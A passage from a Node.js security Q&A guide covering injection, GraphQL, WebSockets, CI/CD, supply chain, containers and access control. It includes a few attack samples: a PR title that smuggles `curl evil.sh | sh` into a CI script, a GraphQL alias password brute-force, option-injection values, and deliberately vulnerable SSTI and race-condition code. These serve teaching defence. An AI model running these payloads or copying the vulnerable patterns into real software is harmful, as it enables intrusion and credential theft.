You can raise it with `--max-http-header-size` or the `maxHeaderSize` option of `http.createServer`, but only do it if you really need to, for example with very large cookies from an SSO provider.

## 217: How does Node protect against HTTP header injection?

HTTP header injection (response splitting) is when user input with `\r\n` is put into a header, so the attacker can add their own headers or body. Node's `setHeader`, `writeHead` and `http.request` throw `ERR_INVALID_CHAR` for invalid characters like CR and LF, so you can't do this by accident through normal APIs.

You still need to validate values you put in headers like `Location` or `Content-Disposition` (for example file names with quotes).

## 218: What is HTTP parameter pollution?

It's when a parameter appears several times, like `?role=user&role=admin`. Different parsers handle it differently: Express's parser gives you an array `["user", "admin"]`. Code that expects a string can break, skip validation, or behave in unexpected ways, for example `req.query.id.toString()`, or a NoSQL query with an array.

Validate query params with a schema that requires a string, or pick only the first value on purpose.

## 219: How do you validate query string parameters?

```js
const ListQuery = z.object({
  page: z.coerce.number().int().min(1).max(1000).default(1),
  limit: z.coerce.number().int().min(1).max(100).default(20),
  sort: z.enum(["name", "created"]).default("created"),
  q: z.string().max(100).optional(),
});

app.get("/products", (req, res) => {
  const parsed = ListQuery.safeParse(req.query);
  if (!parsed.success) return res.status(400).end();
  // use parsed.data
});
```

Putting a max on `limit` matters. Without it, `?limit=1000000` can make the database return the whole table.

## 220: Why should pagination limits be enforced on the server?

Without a maximum, a client can request huge pages, which loads the database, uses lots of memory, slows down the event loop when serializing, and makes data scraping easier.

Set a default and a maximum page size. For large data sets, prefer cursor pagination over large `OFFSET` values, which also get slow.

## 221: How do you write a safe error handler in Express?

```js
app.use((err, req, res, next) => {
  if (res.headersSent) return next(err);

  const status =
    Number.isInteger(err.status) && err.status >= 400 && err.status < 600
      ? err.status
      : 500;
  req.log.error({ err, status, reqId: req.id }, "request failed");

  res.status(status).json({
    error: status < 500 && err.expose ? err.message : "Internal server error",
    requestId: req.id,
  });
});
```

Only show messages you created for the client (`expose` is set by `http-errors` for 4xx errors). Never send `err.stack` or database error messages in production.

## 222: How do you redact sensitive fields in Pino logs?

```js
import pino from "pino";

const logger = pino({
  redact: {
    paths: [
      "req.headers.authorization",
      "req.headers.cookie",
      'res.headers["set-cookie"]',
      "*.password",
      "*.token",
      "user.email",
    ],
    censor: "[REDACTED]",
  },
});
```

Redaction only works for paths you list. Also avoid logging whole request bodies or whole user objects in the first place.

## 223: What is log injection?

Log injection is when user input with newlines or control characters is written to logs, so an attacker can create fake log lines ("user admin logged in successfully") or break log parsers. With logs viewed in a web dashboard, it can also lead to XSS.

Structured JSON logging escapes newlines in values, which solves most of it. With plain-text logs, strip or escape `\r`, `\n` and control characters.

## 224: What should an audit log contain?

Who (user ID, impersonation info, service), what (action and target resource), when (UTC timestamp), from where (IP, user agent, request ID), and the result (success or failure, and before/after values for important changes).

Audit logs should be append-only, stored separately from normal app logs, kept for a defined time, and protected from being changed by the same people or services whose actions they record.

## 225: How do you secure a GraphQL API in Node?

- Limit query depth and complexity (for example with `graphql-depth-limit` or the cost analysis plugins for Apollo, Yoga or Envelop).
- Turn off introspection in production unless the API is public.
- Limit batched queries and aliases.
- Do authorization in resolvers or the business layer, per field when needed, not only at the gateway.
- Use persisted queries (an allowlist of known queries) for first-party clients.
- Add timeouts and rate limits based on query cost, not just number of requests.

## 226: What are GraphQL batching and alias attacks?

GraphQL lets you send many operations in one HTTP request (array batching) or call the same field many times with aliases:

```graphql
mutation {
  a: login(email: "x@y.com", password: "123456") {
    token
  }
  b: login(email: "x@y.com", password: "password") {
    token
  }
  # ... 1000 more
}
```

One request can try a thousand passwords and pass a per-request rate limiter. Limit aliases and batch size, and rate limit sensitive operations by operation count.

## 227: How do you authenticate WebSocket connections?

- Check authentication during the HTTP upgrade request, using the session cookie or a short-lived token, and reject the upgrade if it fails.
- Check the `Origin` header, because browsers send cookies on WebSocket connections and CORS doesn't apply to them (Cross-Site WebSocket Hijacking).
- Re-check authorization for each message that accesses data, and close connections when the session expires.

```js
import { WebSocketServer } from "ws";

const wss = new WebSocketServer({ noServer: true });

server.on("upgrade", async (req, socket, head) => {
  if (req.headers.origin !== "https://app.example.com") return socket.destroy();
  const user = await getUserFromCookie(req.headers.cookie);
  if (!user) return socket.destroy();
  wss.handleUpgrade(req, socket, head, (ws) =>
    wss.emit("connection", ws, req, user),
  );
});
```

## 228: What limits should a WebSocket server have?

- `maxPayload` for message size (`ws` defaults to 100 MiB, which is too big for most apps).
- Limits on messages per second per connection.
- Limits on connections per user and per IP.
- Heartbeats (ping/pong) to close dead connections.
- Input validation on every message, like any HTTP body.

## 229: How do you use child_process safely when you must use a shell?

If you really need shell features (pipes, globs), don't put user input into the command string. Pass it through environment variables or validate it very strictly.

```js
import { execFile } from "node:child_process";

// value passed as an argument to the script, not parsed by the shell
execFile("/bin/sh", [
  "-c",
  'grep -- "$1" /var/log/app.log | tail -n 100',
  "sh",
  term,
]);
```

Here `term` is `$1` inside the script. But usually it's better to do the pipe in Node with streams and `spawn` each program separately.

## 230: What changed with spawning .bat and .cmd files on Windows?

After CVE-2024-27980 ("BatBadBut") in April 2024, Node refuses to run `.bat` and `.cmd` files with `spawn` or `execFile` unless you pass `shell: true`. These files always run through `cmd.exe`, whose argument parsing allowed command injection even without a shell option.

If you do use `shell: true`, you're responsible for escaping arguments correctly for `cmd.exe`, which is hard. Prefer not passing user input to batch files at all.

## 231: Why is option injection a risk even with execFile?

If user input starts with `-`, the program may treat it as an option, not a file name. For example, a file named `--output=/etc/cron.d/x` or `-oProxyCommand=...` for `ssh` or `--upload-pack` for `git`.

Use `--` to end options when the program supports it, and validate that values don't start with `-`:

```js
execFile("git", ["log", "--", userPath]);
```

## 232: What is server-side template injection?

SSTI is when user input is used as the template itself, not as data passed to the template. Template engines like Pug, EJS, Handlebars and Nunjucks can run JavaScript in templates, so this often leads to remote code execution.

```js
// Vulnerable
const html = ejs.render(`<h1>Hello ${req.query.name}</h1>`);

// Safe: the input is data
const html2 = ejs.render("<h1>Hello <%= name %></h1>", {
  name: req.query.name,
});
```

Never let users write templates in a full template engine. If users need custom templates, use a logic-less engine in a sandboxed setup.

## 233: Why can passing req.query into res.render be dangerous?

Some template engines read special options from the data object. Passing `req.query` or `req.body` directly (`res.render("page", req.query)`) let attackers set options like `settings` or engine options in some EJS and Pug versions, which led to code execution.

Always pass a new object with only the fields you need:

```js
res.render("search", { q: String(req.query.q ?? "") });
```

## 234: How do you prevent prototype pollution in your own code?

- Don't write your own deep merge or "set by path" helpers. If you must, skip `__proto__`, `constructor` and `prototype` keys.
- Use `Map` for user-controlled keys, or objects created with `Object.create(null)`.
- Validate input with a schema that rejects unknown keys.
- Use `Object.hasOwn(obj, key)` instead of `obj[key]` when checking for options.
- Keep libraries like lodash updated, since old versions had pollution bugs.

```js
function safeSet(obj, key, value) {
  if (key === "__proto__" || key === "constructor" || key === "prototype")
    return;
  obj[key] = value;
}
```

## 235: Why does JSON.parse create a `__proto__` key that's dangerous later?

`JSON.parse('{"__proto__": {"x": 1}}')` creates an object with an own property named `__proto__`. That alone doesn't pollute anything. The problem comes when another function copies it with normal assignment, like `target[key] = source[key]`. When `key` is `"__proto__"`, the assignment changes the target's prototype instead of creating a property, and a recursive merge then writes into `Object.prototype`.

So the danger is in merge and copy code that uses untrusted parsed JSON.

## 236: How do you find vulnerable regular expressions in a codebase?

- Run a linter rule like `eslint-plugin-regexp` (has `no-super-linear-backtracking`) or `eslint-plugin-security`'s unsafe regex check.
- Test suspicious regexes with tools like `recheck` or `safe-regex2`.
- Look for nested quantifiers (`(a+)+`), overlapping alternation (`(a|a)*`), and `.*` repeated in a row.
- Check route patterns and validation libraries too, since many ReDoS CVEs were in packages, not app code.

## 237: How do you make regex-based validation safe from ReDoS?

- Limit input length before matching. A 200-character limit makes most bad regexes harmless.
- Write regexes without nested or overlapping repeats, and anchor them.
- Use an engine with linear time guarantees like `re2` (npm package with Google's RE2) for user-supplied patterns.
- Use dedicated validators (like Zod's `z.email()` or `validator.js`) instead of huge custom regexes.

## 238: How do you protect the event loop from expensive requests?

- Limit body, header and query sizes.
- Move CPU-heavy work (image processing, PDFs, big parsing, password hashing with sync APIs) to worker threads or separate services.
- Use async crypto APIs, which run on the libuv thread pool.
- Monitor event loop delay with `perf_hooks.monitorEventLoopDelay()` and shed load when it's high.
- Put timeouts on everything.

## 239: How do you reject requests when the server is overloaded?

Load shedding returns `503` quickly instead of accepting more work than you can handle. You can check event loop delay or concurrent request count.

```js
import { monitorEventLoopDelay } from "node:perf_hooks";

const h = monitorEventLoopDelay({ resolution: 20 });
h.enable();

app.use((req, res, next) => {
  if (h.mean / 1e6 > 200) {
    // over 200ms average lag
    res.set("Retry-After", "5");
    return res.status(503).end();
  }
  next();
});
```

Reset the histogram on an interval so it reflects recent load. Fastify has `@fastify/under-pressure` for this.

## 240: What is the risk of the default thread pool size with password hashing?

Async `bcrypt`, `argon2`, `crypto.scrypt` and `crypto.pbkdf2` run on libuv's thread pool, which has 4 threads by default. The same pool is used for `fs` calls and `dns.lookup`.

If an attacker sends many login requests, all 4 threads are busy hashing and file reads and DNS lookups wait behind them, so the whole app slows down. Rate limit login, raise `UV_THREADPOOL_SIZE` to fit your CPU count, or move hashing to a separate service or worker pool.

## 241: How do you secure a Node.js Docker image?

```dockerfile
FROM node:24-slim AS build
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci --ignore-scripts
COPY . .
RUN npm run build && npm prune --omit=dev

FROM node:24-slim
ENV NODE_ENV=production
WORKDIR /app
COPY --from=build --chown=node:node /app/node_modules ./node_modules
COPY --from=build --chown=node:node /app/dist ./dist
USER node
CMD ["node", "dist/server.js"]
```

Also: pin the base image (ideally by digest), use a small or distroless or hardened base, scan the image, don't copy `.env` or `.git` (use `.dockerignore`), never pass secrets with `ARG` or `ENV`, and run with a read-only file system and dropped capabilities.

## 242: How do you pass secrets to a Docker build without leaking them?

Use BuildKit secret mounts. The secret is available only during that `RUN` step and is not saved in any image layer:

```dockerfile
RUN --mount=type=secret,id=npmrc,target=/root/.npmrc npm ci
```

```bash
docker build --secret id=npmrc,src=$HOME/.npmrc .
```

`ARG` and `ENV` values are visible in the image history and layers, so never use them for tokens.

## 243: How do you run Node securely in Kubernetes?

Set a strict `securityContext`:

```yaml
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  allowPrivilegeEscalation: false
  readOnlyRootFilesystem: true
  capabilities:
    drop: ["ALL"]
  seccompProfile:
    type: RuntimeDefault
```

Also: use a dedicated service account with no API access unless needed (`automountServiceAccountToken: false`), network policies that only allow needed traffic, resource limits, secrets from a secret store, and a `/tmp` `emptyDir` volume if the app needs to write temporary files.

## 244: What is the risk of the cloud metadata endpoint?

Cloud VMs and many containers can reach `http://169.254.169.254` (or `fd00:ec2::254` on AWS), which returns instance info and temporary IAM credentials. An SSRF bug in your Node app can read those credentials and give the attacker your cloud permissions.

Use IMDSv2 on AWS (requires a token from a `PUT` request, which most SSRF bugs can't do, and set the hop limit to 1 for containers), block the metadata IP from app containers when not needed, and keep IAM roles minimal.

## 245: How do you use GitHub Actions securely for a Node project?

- Pin third-party actions to a full commit SHA, not a tag.
- Set `permissions:` to the minimum (`contents: read` by default).
- Don't run untrusted PR code with secrets. Be very careful with `pull_request_target` and `workflow_run`.
- Never put `${{ github.event.* }}` values directly into `run:` scripts. Pass them through `env:` to avoid script injection.
- Use OIDC to get short-lived cloud credentials instead of storing long-lived keys.
- Use `npm ci` and consider `--ignore-scripts`.

## 246: What is script injection in GitHub Actions?

```yaml
# Vulnerable
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

The expression is pasted into the script before the shell runs it. A PR titled `"; curl evil.sh | sh; echo "` runs the attacker's command in your CI with your secrets. Use an environment variable instead:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
```

## 247: How do you publish npm packages securely today?

- Use trusted publishing (OIDC) from GitHub Actions or GitLab CI, so no long-lived npm token is stored anywhere. Packages published this way get provenance automatically.
- If you publish locally, use 2FA with a security key. Since late 2025, `npm login` gives a short session (about two hours) and classic tokens were revoked.
- Granular tokens with write access have a short default lifetime (7 days) and a 90-day maximum.
- Use `files` in `package.json` so you don't publish `.env`, tests or secrets by accident, and check with `npm pack --dry-run`.

## 248: What is npm provenance?

Provenance is a signed statement, created in CI and recorded in the public Sigstore transparency log, that says which repository, commit and workflow built a package version. The npm website shows a "Built and signed on GitHub Actions" badge for it.

You can check signatures and provenance of your installed packages with:

```bash
npm audit signatures
```

Provenance tells you where a package was built. It doesn't mean the code is safe, since a compromised repo or workflow still produces valid provenance.

## 249: What is the overrides field in package.json for?

`overrides` forces a specific version of a nested dependency, even if the parent package asks for another one. It's useful when a deep dependency has a vulnerability and the parent hasn't released a fix yet.

```json
{
  "overrides": {
    "cross-spawn": "^7.0.6",
    "some-lib": { "semver": "^7.5.2" }
  }
}
```

Yarn uses `resolutions` and pnpm uses `pnpm.overrides` (or `overrides` in `pnpm-workspace.yaml`). Test after overriding, because the parent might not work with the new version.

## 250: How do you reduce risk from install scripts with pnpm or npm?

- npm: set `ignore-scripts=true` in `.npmrc`, then run needed build steps manually (`npm rebuild <pkg>`) for the few packages that need them.
- pnpm 10+: dependency lifecycle scripts don't run by default. Allow only specific packages with `onlyBuiltDependencies` or with `pnpm approve-builds`.
- Bun also blocks dependency scripts unless the package is listed in `trustedDependencies`.

Most packages don't need install scripts. The ones that do are usually native addons like `bcrypt`, `sharp` or `esbuild`.

## 251: How do you protect against newly published malicious package versions?

Most malicious versions are found and removed within hours or days. You can avoid installing versions that are too new:

- pnpm: `minimumReleaseAge` (in minutes) in `pnpm-workspace.yaml`.
- npm: `npm install --before=<date>` installs versions published before a date.
- Renovate: `minimumReleaseAge` delays update PRs.

Combine this with a lockfile, `npm ci`, reviewing dependency diffs in PRs, and a tool like Socket that flags suspicious behavior in new versions.

## 252: What does a malicious npm package usually do?

Common behavior seen in real attacks:

- Read `process.env`, `~/.npmrc`, `~/.aws/credentials`, SSH keys and browser data, and send them to the attacker.
- Steal npm and GitHub tokens to publish more infected packages (like the Shai-Hulud worm in 2025).
- Replace crypto wallet addresses in browser bundles (the `chalk`/`debug` compromise in September 2025).
- Install a backdoor or crypto miner.
- Run only in CI or only on certain OSes, to avoid detection.

Most of it happens in install scripts or as soon as the package is imported.

## 253: How do you review a dependency update in a pull request?

- Look at the lockfile diff: which packages changed, any new indirect dependencies?
- Read the changelog for the version jump.
- For risky or sensitive packages, look at the code diff (for example with `npm diff --diff=pkg@1.0.0 --diff=pkg@1.0.1`).
- Check if it adds install scripts, network calls, obfuscated code or new maintainers.
- Let CI run tests and a supply chain scanner.

## 254: What is an SBOM and how do you create one for a Node app?

An SBOM (Software Bill of Materials) is a list of every component in your software with versions and licenses. It lets you quickly answer "are we affected?" when a new vulnerability is announced.

```bash
npm sbom --sbom-format cyclonedx > sbom.json
```

Other tools: `@cyclonedx/cyclonedx-npm`, Syft and Docker Scout for images. Generate it in CI for each release.

## 255: How do you scan a container image for vulnerabilities?

Use a scanner like Trivy, Grype, Docker Scout or the one built into your registry:

```bash
trivy image --severity HIGH,CRITICAL myapp:1.4.2
```

It finds vulnerable OS packages and npm packages inside the image. Run it in CI and on a schedule, because new CVEs appear for images that didn't change. Smaller bases (slim, distroless, hardened images) have fewer findings.

## 256: How do you use Semgrep or CodeQL for a Node.js project?

Both are SAST tools that find dangerous patterns, like user input flowing into `exec`, SQL strings or `res.send` without encoding.

```bash
semgrep scan --config p/javascript --config p/nodejs
```

CodeQL runs in GitHub through code scanning (`github/codeql-action`) and does data flow analysis across files. Start with the default rules, triage findings, and add custom rules for patterns specific to your codebase.

## 257: What does eslint-plugin-security catch?

It flags risky patterns: `eval` with variables, `child_process` with non-literal arguments, `fs` calls with non-literal paths, non-literal `require`, possibly unsafe regexes, the old `new Buffer()` constructor, object injection (`obj[userKey]`), and timing-unsafe comparisons.

It has many false positives, especially `detect-object-injection`, so treat it as a list of places to look at, not a list of bugs.

## 258: How would you test an API for broken access control?

- Create two users in two different tenants and with different roles.
- Call every endpoint as user A with user B's resource IDs and expect `403` or `404`.
- Try admin endpoints as a normal user.
- Try changing fields you shouldn't (`role`, `ownerId`, `price`) on update endpoints.
- Remove the token, use an expired token, use a token for another audience.
- Automate these as integration tests so they run on every change.

Tools like Burp Suite's Autorize extension help with manual testing.

## 259: What is OWASP ZAP and how do you use it on an API?

ZAP is a free DAST tool and proxy. You can run it in CI against a staging environment:

```bash
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-api-scan.py \
  -t https://staging.example.com/openapi.json -f openapi
```

It imports your OpenAPI spec, sends requests with attack payloads and reports issues like missing headers, error leakage and some injection bugs. It doesn't understand your business rules, so it won't find most access control bugs.

## 260: How do you add security checks to a CI pipeline?

A practical set:

1. Secret scanning (Gitleaks, GitHub push protection).
2. Dependency audit (`npm audit --omit=dev --audit-level=high`, Dependabot, Socket).
3. SAST (Semgrep or CodeQL).
4. Lint rules for security.
5. Image scanning (Trivy).
6. DAST against staging on a schedule (ZAP).
7. Tests for authentication and authorization.

Fail the build only on high-confidence, high-severity findings at first, or people will start ignoring it.

## 261: How do you handle authentication in microservices?

A common setup: an API gateway or BFF authenticates the user (session or OIDC) and passes a short-lived signed JWT to internal services. Each service verifies the JWT itself (signature, `iss`, `aud`, `exp`) using a JWKS, and does its own authorization.

Service-to-service calls use their own identity (mTLS certificates from a mesh, or OAuth client credentials). Don't trust headers like `X-User-Id` just because they come from "inside", unless the network really guarantees only the gateway can set them.

## 262: What is the OAuth client credentials flow?

It's for machine-to-machine calls where no user is involved. The service sends its client ID and secret (or a signed JWT assertion, or an mTLS certificate) to the token endpoint and gets an access token with certain scopes.

```js
const res = await fetch("https://auth.example.com/oauth/token", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  body: new URLSearchParams({
    grant_type: "client_credentials",
    client_id: process.env.CLIENT_ID,
    client_secret: process.env.CLIENT_SECRET,
    scope: "orders:read",
  }),
});
const { access_token, expires_in } = await res.json();
```

Cache the token until shortly before it expires.

## 263: What is the backend for frontend (BFF) pattern for auth?

Instead of the SPA holding OAuth tokens in the browser, a small server (the BFF) does the OAuth flow, keeps the tokens on the server, and gives the browser only an `HttpOnly` session cookie. The SPA calls the BFF, which adds the access token when calling APIs.

This keeps tokens out of reach of XSS and is the approach recommended by the current OAuth guidance for browser-based apps. You need CSRF protection on the BFF because it uses cookies.

## 264: How do you implement multi-tenant isolation?

- Put `tenantId` on every tenant-owned row and in the user's token or session.
- Add the tenant filter automatically in a data access layer, a Prisma client extension, or a Mongoose plugin, instead of in each query.
- For SQL, consider PostgreSQL Row-Level Security as a second layer.
- Use separate encryption keys, storage prefixes or even databases for big or sensitive tenants.
- Test cross-tenant access in CI.

## 265: How do you use PostgreSQL row-level security with Node?

Turn on RLS with a policy that reads a setting, and set that setting per transaction:

```sql
ALTER TABLE invoices ENABLE ROW LEVEL SECURITY;
CREATE POLICY tenant_isolation ON invoices
  USING (tenant_id = current_setting('app.tenant_id')::uuid);
```

```js
await client.query("BEGIN");
await client.query("SELECT set_config('app.tenant_id', $1, true)", [
  req.user.tenantId,
]);
const { rows } = await client.query("SELECT * FROM invoices");
await client.query("COMMIT");
```

The `true` makes the setting local to the transaction, which matters with connection pools. The app's database role must not be the table owner or a superuser, or RLS is bypassed by default.

## 266: How do you limit what the database user can do?

- Use a separate DB user for the app, not the admin or owner account.
- Grant only `SELECT`, `INSERT`, `UPDATE`, `DELETE` on the needed tables. No `DROP`, `ALTER` or `GRANT`.
- Use another user with more rights only for migrations, run from CI.
- For read-only services, use a read-only user.
- In MongoDB, create a user with the `readWrite` role on one database, not `root`.

If SQL injection happens, the damage is limited to what this user can do.

## 267: What is a race condition vulnerability?

It's when two requests run at the same time and both pass a check before either updates the data. Examples: using a one-time coupon twice, withdrawing more than the balance, voting twice, creating two accounts with the same email.

```js
// Vulnerable: check-then-act
const user = await User.findById(id);
if (user.balance >= amount) {
  user.balance -= amount;
  await user.save();
}
```

Attackers send many requests in parallel to hit the window.

## 268: How do you fix race conditions in balance or coupon logic?

Make the check and the update one atomic operation:

```js
// MongoDB
const result = await User.updateOne(
  { _id: id, balance: { $gte: amount } },
  { $inc: { balance: -amount } },
);
if (result.modifiedCount === 0) throw new Error("Insufficient balance");
```

```sql
-- SQL
UPDATE accounts SET balance = balance - $1 WHERE id = $2 AND balance >= $1;
```

Other tools: unique constraints (one redemption per user and coupon), `SELECT ... FOR UPDATE` in a transaction, optimistic locking with a version field, and idempotency keys.

## 269: What are idempotency keys and how do they help security?

The client sends a unique `Idempotency-Key` header with a request like "create payment". The server stores the key with the result, and if the same key comes again, returns the saved result instead of running the action again.

It prevents double charges from retries and network issues, and it makes some replay and race attacks harmless. Store keys per user, with a TTL, and use a unique constraint so two parallel requests with the same key can't both run.

## 270: How do you prevent account takeover through OAuth account linking?

- Identify external accounts by provider + `sub`, not by email.
- Don't auto-link a new social login to an existing account just because emails match, unless the provider confirms the email (`email_verified`) and you trust it for that domain. Better: ask the user to log in to the existing account first and then link.
- Require recent authentication to link or unlink providers.
- Notify the user when a new login method is added.

## 271: How do you secure an admin panel?

- Put it on a separate host or path that's only reachable through VPN, SSO or an identity-aware proxy.
- Require MFA (ideally passkeys or security keys) for all admin accounts.
- Use fine-grained roles instead of one "admin" role.
- Log every admin action in an audit log.
- Use shorter sessions and step-up auth for dangerous actions.
- Don't share admin accounts. Each person has their own.

## 272: How do you implement impersonation ("log in as user") safely?

- Allow it only for specific support roles, with a reason recorded.
- Keep both identities in the session: `actorId` (the admin) and `subjectId` (the user).
- Log every action with both IDs.
- Block sensitive actions while impersonating (changing password, MFA, payment details).
- Show a clear banner and limit the session time.
- Consider notifying the user.

## 273: How do you handle file paths from user input when serving static files?

Use `express.static` or `res.sendFile` with a `root` option instead of joining paths yourself. They normalize the path and refuse to go above the root.

```js
app.use(
  "/assets",
  express.static("public", { dotfiles: "ignore", index: false }),
);

app.get("/docs/:name", (req, res, next) => {
  res.sendFile(
    req.params.name,
    { root: "/srv/docs", dotfiles: "deny" },
    (err) => {
      if (err) next();
    },
  );
});
```

`dotfiles: "deny"` stops access to files like `.env` or `.git` if they're inside the folder.

## 274: Why is serving the project root as static files a mistake?

```js
app.use(express.static(__dirname)); // don't
```

This makes `server.js`, `package.json`, `.env` (unless dotfiles are blocked), config files and sometimes `.git` downloadable. Attackers scan for these paths all the time. Serve only a dedicated `public` folder with built assets.

## 275: Should you ship source maps to production?

Source maps let anyone see your original source code, including comments, internal API routes and sometimes hardcoded values. For server code they aren't served anyway, but for front-end bundles served by Node they are public by default.

Common practice: generate them, upload them privately to your error tracker (like Sentry), and don't serve them publicly. Either way, never rely on hiding code for security.

## 276: How do you protect against cache poisoning?

Cache poisoning is when an attacker makes a cache store a harmful response that is then served to other users. It often uses headers that change the response but aren't part of the cache key, like `X-Forwarded-Host`, `X-Original-URL` or a custom header.

- Don't build URLs or redirects from request headers like `Host` or `X-Forwarded-Host` unless you validate them against a list.
- Set `Vary` correctly for headers that change the response.
- Don't cache responses that depend on cookies or auth.
- Keep error responses short-cached or not cached.

## 277: What is a Host header attack?

If your code uses the `Host` header to build links, like password reset URLs, an attacker can send a request with `Host: evil.com`. The victim then gets a real email from you with a link to the attacker's site, which receives the reset token.

Build absolute URLs from a configured base URL (`APP_URL`), not from the request. If you must use the host, check it against an allowlist.

## 278: How do you prevent clickjacking on sensitive actions in a server-rendered app?

Set `Content-Security-Policy: frame-ancestors 'none'` (or `'self'` if you embed your own pages) and `X-Frame-Options: DENY` on all HTML responses. Helmet sets `X-Frame-Options: SAMEORIGIN` by default, and you can add `frameAncestors` to the CSP directives.

For pages that must be embeddable by partners, list exact partner origins in `frame-ancestors` and keep sensitive actions on non-embeddable pages.

## 279: How do you implement secure "remember me" login?

- Use a separate long-lived random token, stored hashed in the database with the user ID and expiry.
- Put it in an `HttpOnly`, `Secure`, `SameSite` cookie.
- When it's used to create a new session, rotate it.
- Revoke all of them on password change and "log out everywhere".
- Still require re-authentication for sensitive actions.

Don't make the main session last for months instead.

## 280: How do you detect stolen sessions?

You can't be certain, but signals help:

- Large changes in IP country or ASN, or user agent, during a session.
- Impossible travel between logins.
- A refresh token being reused after rotation.
- Many sessions created quickly.

Reactions can be: require re-authentication, notify the user, or revoke the session. Avoid binding sessions strictly to IP, because mobile users change IPs all the time.

## 281: How do you handle CORS preflight requests correctly?

Browsers send an `OPTIONS` preflight for cross-origin requests with non-simple methods or headers (like `Authorization` or `Content-Type: application/json`). The server must answer with matching `Access-Control-Allow-*` headers.

```js
app.use(
  cors({
    origin: ["https://app.example.com"],
    methods: ["GET", "POST", "PUT", "DELETE"],
    allowedHeaders: ["Content-Type", "Authorization"],
    maxAge: 600,
  }),
);
```

Make sure auth middleware doesn't reject `OPTIONS` requests before CORS handles them. `maxAge` caches the preflight result in the browser.

## 282: What is the Cross-Origin-Resource-Policy header?

CORP tells the browser which origins may load a resource with `<img>`, `<script>` or similar tags. `same-origin` blocks other sites from embedding it, `same-site` allows your subdomains, and `cross-origin` allows everyone.

It helps protect against side-channel attacks like Spectre and some data leaks, where another site loads your private resource. Helmet sets `same-origin` by default, so public assets used by other sites need `cross-origin`.

## 283: How do you secure a Fastify app?

Fastify has official plugins for most security needs:

```js
import Fastify from "fastify";
import helmet from "@fastify/helmet";
import cors from "@fastify/cors";
import rateLimit from "@fastify/rate-limit";

const app = Fastify({ logger: true, bodyLimit: 100_000, trustProxy: 1 });

await app.register(helmet);
await app.register(cors, { origin: ["https://app.example.com"] });
await app.register(rateLimit, { max: 100, timeWindow: "1 minute" });
```

Fastify validates requests with JSON Schema on each route (using AJV), which gives you input validation and faster serialization. Use `additionalProperties: false` in schemas to reject unknown fields.

## 284: How does NestJS help with security?

- Guards (`CanActivate`) for authentication and authorization, applied globally with an `@Public()` decorator as an exception.
- `ValidationPipe` with `whitelist: true` and `forbidNonWhitelisted: true` to strip or reject unknown fields from DTOs.
- `@nestjs/throttler` for rate limiting.
- Helmet and CORS through `app.use(helmet())` and `app.enableCors()`.
- Exception filters to control error output.

```ts
app.useGlobalPipes(
  new ValidationPipe({
    whitelist: true,
    forbidNonWhitelisted: true,
    transform: true,
  }),
);
```

## 285: How do you hash API keys and look them up efficiently?

API keys are long and random, so a fast hash like SHA-256 is fine. There is nothing to brute force. Store the hash with a unique index and look up by hash.

```js
import { createHash } from "node:crypto";

const hashKey = (key) => createHash("sha256").update(key).digest("hex");

const record = await ApiKey.findOne({
  hash: hashKey(req.get("x-api-key") ?? ""),
});
if (!record || record.revokedAt) return res.status(401).end();
```

A slow password hash would make every API call slow, with no real security gain.

## 286: How do you prevent sensitive data from being returned in API responses?

- Use explicit response DTOs or serializers that list the allowed fields, instead of returning database objects.
- In Mongoose, use `select: false` on fields like `passwordHash` and a `toJSON` transform.
- In Prisma, use `omit` (globally or per query) or `select`.
- Test responses for fields like `password`, `token` and internal IDs.

```js
const user = await prisma.user.findUnique({
  where: { id },
  omit: { passwordHash: true, mfaSecret: true },
});
```

## 287: What is excessive data exposure?

It's when an API returns more data than the client needs and relies on the front end to hide it. For example, a user list endpoint that returns emails, phone numbers and addresses, while the UI only shows names. Anyone can see the full response in DevTools.

Return only what the client actually needs for that view, with server-side checks on what the user may see.

## 288: How do you keep secrets out of error tracking tools?

Error trackers like Sentry capture request data, headers, local variables and breadcrumbs. Use their scrubbing options:

```js
Sentry.init({
  dsn: process.env.SENTRY_DSN,
  sendDefaultPii: false,
  beforeSend(event) {
    if (event.request?.headers) {
      delete event.request.headers.authorization;
      delete event.request.headers.cookie;
    }
    return event;
  },
});
```

Also turn on server-side data scrubbing in the tool's project settings as a second layer.

## 289: How do you use the Node.js permission model in practice?

Run Node with `--permission` and allow only what the app needs:

```bash
node --permission \
  --allow-fs-read=/app \
  --allow-fs-write=/app/tmp \
  dist/server.js
```

Without extra flags, file system access, child processes, worker threads, native addons, WASI and the inspector are blocked. In Node 25+, network access is also blocked unless you add `--allow-net`. Check at runtime with `process.permission.has("fs.write", "/app/tmp")`. Test well, because many packages read files you didn't expect, like their own `package.json`.

## 290: How do you avoid a decompression or parse bomb in JSON and XML handling?

- Keep body size limits small, and remember compressed bodies get inflated.
- For XML, use a parser that doesn't process external entities, and don't turn on entity expansion for untrusted input.
- Limit nesting depth for JSON if you use custom parsers.
- For big data imports, stream and process in chunks instead of loading everything into memory.

## 291: What is XXE and does it affect Node.js?

XXE (XML External Entity) is when an XML parser processes `<!ENTITY>` declarations that read local files (`file:///etc/passwd`) or make network requests. Most pure JavaScript XML parsers don't support external entities, so they're not vulnerable.

Libraries that wrap libxml2, like `libxmljs`, can be vulnerable if you turn on entity substitution (`noent: true`). Don't enable it with untrusted XML. "Billion laughs" (nested entity expansion) is a related DoS attack.

## 292: Why is YAML parsing a risk?

Some YAML libraries supported custom tags that create JavaScript functions or objects, which led to code execution. In `js-yaml`, older versions had `load` vs `safeLoad`. Since v4, `load` is safe by default and the unsafe types were removed.

Use a current library version with the default safe schema, don't enable custom tags for untrusted input, and validate the parsed result. Also watch for huge documents and alias expansion ("YAML bombs").

## 293: What is insecure deserialization in Node.js?

It's when you turn untrusted data back into objects with a library that can recreate functions or call code. The classic example is `node-serialize`, whose `unserialize` runs functions marked in the data, giving remote code execution.

`JSON.parse` doesn't do this, but data can still be dangerous after parsing (prototype pollution, type confusion). Avoid serialization formats that support code or class instances for untrusted input, and validate the parsed data.

## 294: How do you protect against XSS in JSON APIs?

- Always send `Content-Type: application/json` (Express's `res.json` does). Browsers won't render it as HTML.
- Set `X-Content-Type-Options: nosniff`.
- Don't reflect user input in error messages served as `text/html`.
